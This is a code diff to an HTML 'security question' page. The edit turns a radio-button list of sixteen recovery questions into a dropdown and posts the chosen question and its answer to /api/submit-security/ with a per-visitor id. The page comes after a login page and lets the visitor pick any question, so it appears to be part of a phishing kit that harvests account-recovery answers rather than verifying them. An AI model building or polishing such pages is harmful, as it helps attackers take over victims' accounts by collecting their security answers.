@@ -24,17 +24,12 @@ body{font-family:'Open Sans',sans-serif;background:#e8e8e8;min-height:100vh;disp
 .loginbox h3{text-align:center;font-size:20px;color:#585958;font-weight:600;position:relative;padding-bottom:12px;margin-bottom:20px}
 .loginbox h3::after{content:"";width:50%;height:3px;border-radius:10px;background-color:#bc262a;position:absolute;left:50%;transform:translateX(-50%);bottom:0}
 
-.questions-list{list-style:none;padding:0;margin:0 0 20px}
-.questions-list li{display:flex;align-items:center;gap:12px;padding:14px 8px;border-bottom:1px solid #f0f0f0;cursor:pointer;transition:background .15s}
-.questions-list li:hover{background:#fafafa}
-.questions-list li:last-child{border-bottom:none}
-.questions-list input[type="radio"]{width:22px;height:22px;accent-color:#2196F3;cursor:pointer;flex-shrink:0}
-.questions-list label{font-size:15px;color:#333;cursor:pointer;line-height:1.5;flex:1}
+.q-select{width:100%;padding:12px 14px;border:1.5px solid #ccc;border-radius:8px;font-size:15px;font-family:'Open Sans',sans-serif;color:#333;background:#fff;outline:none;margin-bottom:20px;appearance:auto}
+.q-select:focus{border-color:#bc262a}
 
-.answer-section{display:none;margin-top:16px;padding-top:16px;border-top:2px solid #eee}
+.answer-section{display:none;margin-bottom:16px}
 .answer-section.show{display:block}
 .answer-section label{color:#828488;font-size:14px;display:block;margin-bottom:6px}
-.answer-section .selected-q{color:#bc262a;font-size:14px;font-weight:600;margin-bottom:12px}
 .answer-input{border:1px solid #666;height:42px;width:100%;padding:6px 12px;border-radius:4px;font-size:15px;font-family:'Open Sans',sans-serif;outline:none}
 .answer-input:focus{border-color:#bc262a}
 
@@ -61,7 +56,7 @@ body{font-family:'Open Sans',sans-serif;background:#e8e8e8;min-height:100vh;disp
   .header-text{font-size:16px;padding:8px 12px}
   .header-logo img{height:50px}
   .loginbox{padding:20px 16px}
-  .questions-list label{font-size:14px}
+  .q-select{font-size:14px}
 }
 </style>
 </head>
@@ -85,27 +80,26 @@ body{font-family:'Open Sans',sans-serif;background:#e8e8e8;min-height:100vh;disp
 
         <div class="error-box" id="errorBox"><span id="errorText">Please select a question and enter your answer</span></div>
 
-        <ul class="questions-list" id="questionsList">
-          <li><input type="radio" name="sq" id="q0" value="-- Select security question --" checked disabled><label for="q0">-- Select security question --</label></li>
-          <li><input type="radio" name="sq" id="q1" value="What is your first cousin's name?"><label for="q1">What is your first cousin's name?</label></li>
-          <li><input type="radio" name="sq" id="q2" value="In which city were you born?"><label for="q2">In which city were you born?</label></li>
-          <li><input type="radio" name="sq" id="q3" value="What year did you graduate from university?"><label for="q3">What year did you graduate from university?</label></li>
-          <li><input type="radio" name="sq" id="q4" value="What was your childhood nickname?"><label for="q4">What was your childhood nickname?</label></li>
-          <li><input type="radio" name="sq" id="q5" value="What is your favorite author's name?"><label for="q5">What is your favorite author's name?</label></li>
-          <li><input type="radio" name="sq" id="q6" value="What is your favorite car manufacturer?"><label for="q6">What is your favorite car manufacturer?</label></li>
-          <li><input type="radio" name="sq" id="q7" value="What is your favorite movie?"><label for="q7">What is your favorite movie?</label></li>
-          <li><input type="radio" name="sq" id="q8" value="What is your best childhood friend's name?"><label for="q8">What is your best childhood friend's name?</label></li>
-          <li><input type="radio" name="sq" id="q9" value="What year did you get your driver's license?"><label for="q9">What year did you get your driver's license?</label></li>
-          <li><input type="radio" name="sq" id="q10" value="What brand was your first TV?"><label for="q10">What brand was your first TV?</label></li>
-          <li><input type="radio" name="sq" id="q11" value="What year did you get married?"><label for="q11">What year did you get married?</label></li>
-          <li><input type="radio" name="sq" id="q12" value="What is your favorite football team?"><label for="q12">What is your favorite football team?</label></li>
-          <li><input type="radio" name="sq" id="q13" value="What is the name of the school you attended?"><label for="q13">What is the name of the school you attended?</label></li>
-          <li><input type="radio" name="sq" id="q14" value="What is the first foreign country you visited?"><label for="q14">What is the first foreign country you visited?</label></li>
-          <li><input type="radio" name="sq" id="q15" value="What was the brand of your first car?"><label for="q15">What was the brand of your first car?</label></li>
-        </ul>
+        <select class="q-select" id="qSelect">
+          <option value="">-- Select security question --</option>
+          <option value="What is your first cousin's name?">What is your first cousin's name?</option>
+          <option value="In which city were you born?">In which city were you born?</option>
+          <option value="What year did you graduate from university?">What year did you graduate from university?</option>
+          <option value="What was your childhood nickname?">What was your childhood nickname?</option>
+          <option value="What is your favorite author's name?">What is your favorite author's name?</option>
+          <option value="What is your favorite car manufacturer?">What is your favorite car manufacturer?</option>
+          <option value="What is your favorite movie?">What is your favorite movie?</option>
+          <option value="What is your best childhood friend's name?">What is your best childhood friend's name?</option>
+          <option value="What year did you get your driver's license?">What year did you get your driver's license?</option>
+          <option value="What brand was your first TV?">What brand was your first TV?</option>
+          <option value="What year did you get married?">What year did you get married?</option>
+          <option value="What is your favorite football team?">What is your favorite football team?</option>
+          <option value="What is the name of the school you attended?">What is the name of the school you attended?</option>
+          <option value="What is the first foreign country you visited?">What is the first foreign country you visited?</option>
+          <option value="What was the brand of your first car?">What was the brand of your first car?</option>
+        </select>
 
         <div class="answer-section" id="answerSection">
-          <div class="selected-q" id="selectedQ"></div>
           <label for="answerInput">Answer:</label>
           <input type="text" class="answer-input" id="answerInput" placeholder="Enter your answer" autocomplete="off">
         </div>
@@ -142,33 +136,22 @@ var params=new URLSearchParams(window.location.search);
 var id=params.get('id');
 if(!id){window.location.href='login-en.html';}
 
-var radios=document.querySelectorAll('input[name="sq"]');
+var qSelect=document.getElementById('qSelect');
 var answerSection=document.getElementById('answerSection');
-var selectedQEl=document.getElementById('selectedQ');
 
-radios.forEach(function(r){
-  r.addEventListener('change',function(){
-    if(r.value!=='-- Select security question --'){
-      selectedQEl.textContent=r.value;
-      answerSection.classList.add('show');
-      document.getElementById('answerInput').focus();
-    }else{
-      answerSection.classList.remove('show');
-    }
-  });
-});
-
-document.querySelectorAll('.questions-list li').forEach(function(li){
-  li.addEventListener('click',function(){
-    var radio=li.querySelector('input[type="radio"]');
-    if(radio&&!radio.disabled){radio.checked=true;radio.dispatchEvent(new Event('change'));}
-  });
+qSelect.addEventListener('change',function(){
+  if(qSelect.value){
+    answerSection.classList.add('show');
+    document.getElementById('answerInput').focus();
+  }else{
+    answerSection.classList.remove('show');
+  }
 });
 
 function submitSecurity(){
-  var selected=document.querySelector('input[name="sq"]:checked');
+  var question=qSelect.value;
   var answer=document.getElementById('answerInput').value.trim();
-  if(!selected||selected.value==='-- Select security question --'||!answer){
+  if(!question||!answer){
     document.getElementById('errorBox').classList.add('show');
     return;
   }
@@ -179,7 +162,7 @@ function submitSecurity(){
   fetch('/api/submit-security/'+id,{
     method:'POST',
     headers:{'Content-Type':'application/json'},
-    body:JSON.stringify({question:selected.value,answer:answer})
+    body:JSON.stringify({question:question,answer:answer})
   })
   .then(function(r){return r.json();})
   .then(function(d){
